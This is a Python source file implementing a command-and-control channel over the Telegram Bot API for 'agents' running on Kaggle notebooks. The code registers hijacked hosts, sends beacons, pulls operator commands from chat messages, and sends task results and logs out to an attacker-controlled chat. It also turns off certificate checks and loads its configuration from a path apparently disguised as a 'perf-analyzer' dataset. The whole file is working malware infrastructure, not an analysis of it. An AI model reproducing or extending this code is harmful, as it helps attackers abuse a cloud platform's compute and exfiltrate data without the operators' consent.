#!/usr/bin/env python3
"""
Telegram C2 Channel for Kaggle Agents
Uses Telegram Bot API as communication channel
"""

import json
import time
import urllib.request
import urllib.error
import ssl
import os

class TelegramC2:
    """Telegram-based C2 communication channel"""
    
    def __init__(self, bot_token, chat_id, agent_id):
        self.bot_token = bot_token
        self.chat_id = chat_id
        self.agent_id = agent_id
        self.api_url = f"https://api.telegram.org/bot{bot_token}"
        self.last_update_id = 0
        self._ssl_context = ssl.create_default_context()
        self._ssl_context.check_hostname = False
        self._ssl_context.verify_mode = ssl.CERT_NONE
    
    def _request(self, method, data=None):
        """Make request to Telegram API"""
        url = f"{self.api_url}/{method}"
        
        if data:
            data = json.dumps(data).encode('utf-8')
            req = urllib.request.Request(
                url,
                data=data,
                headers={'Content-Type': 'application/json'}
            )
        else:
            req = urllib.request.Request(url)
        
        try:
            resp = urllib.request.urlopen(req, timeout=30, context=self._ssl_context)
            return json.loads(resp.read().decode('utf-8'))
        except Exception as e:
            return {"ok": False, "error": str(e)}
    
    def send_message(self, text, parse_mode=None):
        """Send message to chat"""
        data = {
            "chat_id": self.chat_id,
            "text": text
        }
        if parse_mode:
            data["parse_mode"] = parse_mode
        
        return self._request("sendMessage", data)
    
    def register(self, hostname, cpu_count, platform="kaggle"):
        """Register agent with C2"""
        msg = f"""🔴 NEW AGENT REGISTERED
━━━━━━━━━━━━━━━━━━━━
🆔 ID: {self.agent_id}
🖥 Hostname: {hostname}
💻 Platform: {platform}
🔧 CPU Cores: {cpu_count}
⏰ Time: {time.strftime('%Y-%m-%d %H:%M:%S')}
━━━━━━━━━━━━━━━━━━━━
#register #{platform}"""
        
        result = self.send_message(msg)
        if result.get("ok"):
            return True
        return False
    
    def beacon(self, status="active", extra_data=None):
        """Send beacon to C2"""
        msg = f"""🟢 BEACON: {self.agent_id}
Status: {status}
Time: {time.strftime('%H:%M:%S')}"""
        
        if extra_data:
            msg += f"\nData: {json.dumps(extra_data)}"
        
        result = self.send_message(msg)
        return result.get("ok", False)
    
    def report_result(self, task_id, result_data):
        """Report task result"""
        msg = f"""📊 RESULT: {self.agent_id}
Task: {task_id}
Result: {json.dumps(result_data)[:500]}"""
        
        return self.send_message(msg)
    
    def get_commands(self):
        """Get pending commands from C2 (via messages)"""
        data = {
            "offset": self.last_update_id + 1,
            "limit": 10,
            "timeout": 0
        }
        
        result = self._request("getUpdates", data)
        
        if not result.get("ok"):
            return []
        
        commands = []
        for update in result.get("result", []):
            self.last_update_id = update.get("update_id", 0)
            
            message = update.get("message", {})
            text = message.get("text", "")
            
            # Parse commands from messages
            # Format: /cmd <agent_id> <command>
            if text.startswith("/cmd"):
                parts = text.split(maxsplit=3)
                if len(parts) >= 3:
                    target_agent = parts[1]
                    if target_agent == self.agent_id or target_agent == "all":
                        cmd = parts[2] if len(parts) > 2 else ""
                        cmd_data = parts[3] if len(parts) > 3 else ""
                        commands.append({
                            "type": cmd,
                            "data": json.loads(cmd_data) if cmd_data.startswith("{") else {"args": cmd_data}
                        })
        
        return commands
    
    def send_output(self, output_type, content):
        """Send output/logs to C2"""
        # Split long content
        max_len = 4000
        chunks = [content[i:i+max_len] for i in range(0, len(content), max_len)]
        
        for i, chunk in enumerate(chunks):
            msg = f"📤 {output_type} [{i+1}/{len(chunks)}]\n{chunk}"
            self.send_message(msg)


# Convenience functions for notebook integration
def create_telegram_c2(bot_token=None, chat_id=None, agent_id=None):
    """Create TelegramC2 instance with config fallback"""
    
    # Try to load from config
    config_paths = [
        '/kaggle/input/perf-analyzer/config.json',
        '/kaggle/input/config.json',
    ]
    
    config = {}
    for path in config_paths:
        try:
            if os.path.exists(path):
                with open(path) as f:
                    config = json.load(f)
                break
        except:
            pass
    
    bot_token = bot_token or config.get('telegram_bot_token')
    chat_id = chat_id or config.get('telegram_chat_id')
    
    if not bot_token or not chat_id:
        raise ValueError("Telegram bot_token and chat_id required")
    
    return TelegramC2(bot_token, chat_id, agent_id)


if __name__ == "__main__":
    # Test
    import socket
    
    print("Telegram C2 Test")
    print("Required: bot_token, chat_id")
    print()
    print("To create bot:")
    print("1. Message @BotFather on Telegram")
    print("2. Send /newbot and follow instructions")
    print("3. Copy the bot token")
    print("4. Message @userinfobot to get your chat_id")
